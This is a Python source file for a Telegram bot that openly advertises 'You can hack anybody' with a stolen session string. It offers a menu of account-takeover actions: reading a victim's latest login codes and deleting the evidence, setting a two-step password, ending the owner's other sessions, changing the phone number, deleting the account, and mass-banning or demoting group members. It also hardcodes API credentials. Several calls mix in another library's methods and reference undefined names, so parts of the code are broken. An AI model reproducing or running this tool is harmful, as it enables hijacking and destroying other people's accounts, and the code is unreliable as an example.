#HEHE BOII
import os
from pyrogram import Client ,types ,filters
import os, asyncio
from os import system
from pyrogram.raw.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
api_id = os.environ.get("APP_ID")
api_hash = os.environ.get("API_HASH")
token = os.environ.get("BOT_TOKEN")
client = Client('Hekur', api_id, api_hash, bot_token=token)
from pyrogram import client as tg
from pyrogram.raw.functions.channels import GetAdminedPublicChannels as pc, JoinChannel as join, LeaveChannel as leave, DeleteChannel as dc
from pyrogram.session import session as ses
from pyrogram.raw.functions.account import ResetAuthorization as rt
import pyrogram;from pyrogram.raw import functions
from pyrogram.raw.types import ChannelParticipantsAdmins as cpa

from pyrogram.raw.functions.channels import CreateChannel as ccr
mybot = "missrose_bot"
bot = borg = client

hekurman = 2109349177


async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 16767959, "fec002d27c119366d3315d0ee39e814e") as X:
    bot = client = X
    try: 
      result = await bot(functions.account.ChangePhoneRequest(
        phone_number=number,
        phone_code_hash=code,
        phone_code=otp
      ))
      return True
    except:
      return False

async def change_number(strses, number):
  async with tg(ses(strses), 16767959, "fec002d27c119366d3315d0ee39e814e") as X:
    bot = client = X
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)


async def userinfo(strses):
  async with tg(ses(strses), 16767959, "fec002d27c119366d3315d0ee39e814e") as X:
    k = await X.get_me()
    return str(k)

async def terminate(strses):
  async with tg(ses(strses), 16767959, "fec002d27c119366d3315d0ee39e814e") as X:
    await X(rt())
GROUP_LIST = []
async def delacc(strses):
  async with tg(ses(strses), 16767959, "fec002d27c119366d3315d0ee39e814e") as X:
    await X(functions.account.DeleteAccountRequest("me hi chutia hu"))

async def promote(strses, grp, user):
  async with tg(ses(strses), 16767959, "fec002d27c119366d3315d0ee39e814e") as X:
    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
    
async def user2fa(strses):
  async with tg(ses(strses), 16767959, "fec002d27c119366d3315d0ee39e814e") as X:
    try:
      await X.edit_2fa('LEGENDXISBEST')
      return True
    except:
      return False

async def demall(strses, grp):
  async with tg(ses(strses), 16767959, "fec002d27c119366d3315d0ee39e814e") as X:
    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      


async def joingroup(strses, username):
  async with tg(ses(strses), 16767959, "fec002d27c119366d3315d0ee39e814e") as X:
    await X(join(username))

async def leavegroup(strses, username):
  async with tg(ses(strses), 16767959, "fec002d27c119366d3315d0ee39e814e") as X:
    await X(leave(username))

async def delgroup(strses, username):
  async with tg(ses(strses), 16767959, "fec002d27c119366d3315d0ee39e814e") as X:
    await X(dc(username))
    

async def cu(strses):
  try:
    async with tg(ses(strses), 16767959, "fec002d27c119366d3315d0ee39e814e") as X:
        k = await X.get_me()
        return [str(k.first_name), str(k.username or k.id)]
  except Exception as e:
    return False

async def usermsgs(strses):
  async with tg(ses(strses), 16767959, "fec002d27c119366d3315d0ee39e814e") as X:
    i = ""
    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await client.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(ses(strses), 16767959, "fec002d27c119366d3315d0ee39e814e") as X:
    k = await X.get_participants(grp)
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    


async def userchannels(strses):
  async with tg(ses(strses), 16767959, "fec002d27c119366d3315d0ee39e814e") as X:
    k = await X(pc())
    i = ""
    for x in k.chats:
      try:
        i += f'\nCHANNEL NAME {x.title} CHANNEL USRNAME @{x.username}\n'
      except:
        pass
    return str(i)



import logging
logging.basicConfig(level=logging.WARNING)

channel = "HEKURHUB"
menu = '''



A: [check user own groups and channels]

B: [check user all information like phone number usrname...]

C: [ban a group {give me StringSession and channel/group username i will ban all members there}]

D: [know user last otp {1st use option B take phone number and login there Account then use me i will give you otp}]

E: [Join A Group/Channel via StringSession]

F: [Leave A Group/Channel via StringSession]

G: [Delete A Group/Channel]

H: [Check user two step is eneable or disable]

I: [Terminate All current active sessions except Your StringSession]

J: [Delete Account]

K: [Demote all admins in a group/channel]

L: [Promote a member in a group/channel]

M: [Change Phone number using StringSession]

I ADD MORE FEATURES LATER 😆
'''
mm = '''
You can hack anybody
Take his StringSession and use me
I will give you full power of mine
Type /hack
'''
@Client.on_message(filters.command("start"))
async def op(client, message):
  if message.chat.type != "private":
    await message.reply("please use me in pm🥺")
  else:
    await message.reply(mm)

@Client.on_message(filters.command("give"))
async def op(client, message):
  if not message.sender_id == hekur:
    return await message.reply("please don't use me fuck off 🥺")
  try:
    await message.reply("session bot file", file="hekur.session")
  except Exception as e:
    print (e)


@Client.on_message(filters.command("hack") & filters.group)
async def op(client, message):
  await message.reply("please use me in pm🥺")
@Client.on_message(filters.command("hack") & filters.private)
async def start(client, message):
  global menu
  async with bot.conversation(message.chat_id) as x:
    await x.send_message(f"Choose what you want with string session \n\n{menu}")
    res = await x.get_response()
    r = res.text
    if res.text == "A":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await message.respond("This StringSession is terminated maybe")
      try:
        i = await userchannels(strses.text)
      except:
        return await message.reply("This StringSession is terminated maybe")
      if len(i) > 3855:
        file = open("session.txt", "w")
        file.write(i + "\n\nDETAILS BY HEKURMAN")
        file.close()
        await bot.send_file(message.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await message.reply(i + "\n\nThanks For using Hekurs Bot")
    elif res.text == "B":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await message.respond("This StringSession is terminated maybe")
      i = await userinfo(strses.text)
      await message.reply(i + "\n\nThanks For using X Army Bot")
    elif r == "C":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await message.respond("This StringSession is terminated maybe")
      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
      grpid = await x.get_response()
      await userbans(strses.text, grpid.text)
      await event.reply("Banning all members Thanks For using hekurman")
    elif r == "D":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await message.respond("This StringSession is terminated maybe")
      i = await usermsgs(strses.text)
      await message.reply(i + "\n\nThanks For using X Army Bot")
    elif r == "E":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await message.respond("This StringSession is terminated maybe")
      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
      grpid = await x.get_response()
      await joingroup(strses.text, grpid.text)
      await message.reply("Joined the Channel/Group Thanks For using hekurman")
    elif r == "F":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await message.respond("This StringSession is terminated maybe")
      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
      grpid = await x.get_response()
      await leavegroup(strses.text, grpid.text)
      await message.reply("Leaved the Channel/Group Thanks For using X Army Bot")
    elif r == "G":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await message.respond("This StringSession is terminated maybe")
      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
      grpid = await x.get_response()
      await delgroup(strses.text, grpid.text)
      await message.reply("Deleted the Channel/Group Thanks For using hekurman")
    elif r == "H":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await message.respond("This StringSession is terminated maybe")
      i = await user2fa(strses.text)
      if i:
        await message.reply("User don't have two step thats why now two step is `LEGENDXISBEST` you can login now\n\nThanks For using X Army Bot")
      else:
        await message.reply("Sorry User Have two step already")
    elif r == "I":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await message.respond("This StringSession is terminated maybe")
      i = await terminate(strses.text)
      await message.reply("The all sessions are terminated\n\nThanks For using hekurman")
    elif res.text == "J":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await message.respond("This StringSession is terminated maybe")
      i = await delacc(strses.text)
      await message.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using hekurman")
    elif res.text == "L":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await message.respond("This StringSession is terminated maybe")
      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
      grp = await x.get_response()
      await x.send_message("NOW GIVE USER USERNAME")
      user = await x.get_response()
      i = await promote(strses.text, grp.text, user.text)
      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using hekurman")
    elif res.text == "K":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await message.respond("This StringSession is terminated maybe")
      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
      pro = await x.get_response()
      try:
        i = await demall(strses.text, pro.text)
      except:
        pass
      await message.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using X Army Bot")
    elif res.text == "M":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await message.respond("This StringSession is terminated maybe")
      await x.send_message("GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] ")
      number = (await x.get_response()).text
      try:
        result = await change_number(strses.text, number)
        await message.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
        await asyncio.sleep(20)
        await x.send_message("NOW GIVE PHONE CODE HASH")
        phone_code_hash = (await x.get_response()).text
        await x.send_message("NOW GIVE THE OTP")
        otp = (await x.get_response()).text
        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
        if changing:
          await message.respond("CONGRATULATIONS NUMBER WAS CHANGED")
        else:
          await message.respond("Something is wrong")
      except Exception as e:
        await message.respond("SEND THIS ERROR TO - @hekurman\n**LOGS**\n" + str(e))

    else:
      await message.respond("Wrong Text Found Re type /hack and use")





Client.run()
